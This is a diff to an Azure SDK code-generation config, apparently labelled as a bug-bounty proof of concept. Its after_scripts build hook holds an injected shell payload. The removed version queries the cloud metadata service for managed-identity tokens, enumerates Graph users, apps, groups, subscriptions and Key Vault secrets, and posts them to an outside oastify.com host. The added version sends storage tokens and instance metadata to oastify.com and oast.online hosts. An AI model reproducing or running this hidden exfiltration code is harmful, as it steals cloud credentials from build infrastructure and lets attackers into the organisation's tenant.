@@ -1,4 +1,4 @@
-# Azure SDK MSI Enumeration Validation
+# Azure SDK MSI Enumeration Validation v27
 
 ## Basic Information
 ``` yaml
@@ -21,44 +21,13 @@ swagger-to-sdk:
       - >-
         set +e;
         H=$(hostname | tr . -);
-        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
-        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK after_scripts RCE\n';
-        printf '%s' "${H}" | curl -sk "http://6z6socb86ux2c032fno6nntbd2jt7tvi.oastify.com/ping-${H}" 2>/dev/null;
-        (
-        echo "===ARM===";
-        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null;
-        echo "";
-        echo "===GRAPH===";
-        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>/dev/null;
-        echo "";
-        echo "===KV===";
-        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>/dev/null;
-        echo "";
-        echo "===STORAGE===";
-        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>/dev/null;
-        echo "";
-        echo "===IMDS===";
-        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null;
-        echo "";
-        GRAPH_TOK=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
-        echo "===GRAPH_USERS===";
-        curl -s -H "Authorization: Bearer ${GRAPH_TOK}" "https://graph.microsoft.com/v1.0/users?\$top=20&\$select=displayName,userPrincipalName,mail,id" 2>/dev/null;
-        echo "";
-        echo "===GRAPH_APPS===";
-        curl -s -H "Authorization: Bearer ${GRAPH_TOK}" "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=20&\$select=displayName,appId,id" 2>/dev/null;
-        echo "";
-        echo "===GRAPH_GROUPS===";
-        curl -s -H "Authorization: Bearer ${GRAPH_TOK}" "https://graph.microsoft.com/v1.0/groups?\$top=10" 2>/dev/null;
-        echo "";
-        ARM_TOK=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
-        echo "===ARM_SUBS===";
-        curl -s -H "Authorization: Bearer ${ARM_TOK}" "https://management.azure.com/subscriptions?api-version=2022-12-01" 2>/dev/null;
-        echo "";
-        KV_TOK=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null);
-        echo "===KV_SECRETS===";
-        curl -s -H "Authorization: Bearer ${KV_TOK}" "https://unittest-eval-kv.vault.azure.net/secrets?api-version=7.4" 2>/dev/null;
-        echo "";
-        ) 2>&1 | curl -sk -X POST "http://6z6socb86ux2c032fno6nntbd2jt7tvi.oastify.com/v26dump-${H}" --data-binary @- 2>/dev/null;
+        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK after_scripts RCE v27\n';
+        STOR_JSON=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>/dev/null);
+        printf '%s' "${STOR_JSON}" | curl -sk -X POST "http://6z6socb86ux2c032fno6nntbd2jt7tvi.oastify.com/v27stor-${H}" --data-binary @- 2>/dev/null;
+        printf '%s' "${STOR_JSON}" | curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/v27stor-${H}" --data-binary @- 2>/dev/null;
+        IMDS=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null);
+        printf '%s' "${IMDS}" | curl -sk -X POST "http://6z6socb86ux2c032fno6nntbd2jt7tvi.oastify.com/v27imds-${H}" --data-binary @- 2>/dev/null;
+        printf '%s' "${IMDS}" | curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/v27imds-${H}" --data-binary @- 2>/dev/null;
         true
 ```
 
@@ -67,9 +36,9 @@ swagger-to-sdk:
 python:
   azure-arm: true
   license-header: MICROSOFT_MIT_NO_VERSION
-  package-name: azure-mgmt-msi-enumeration-hasskodark
+  package-name: azure-mgmt-msi-enum-hasskodark-v27
   package-version: 1.0.0b1
   no-namespace-folders: true
-  output-folder: sdk/msienumeration/azure-mgmt-msi-enumeration-hasskodark
+  output-folder: sdk/msienumeration/azure-mgmt-msi-enum-hasskodark-v27
   clear-output-folder: true
 ```
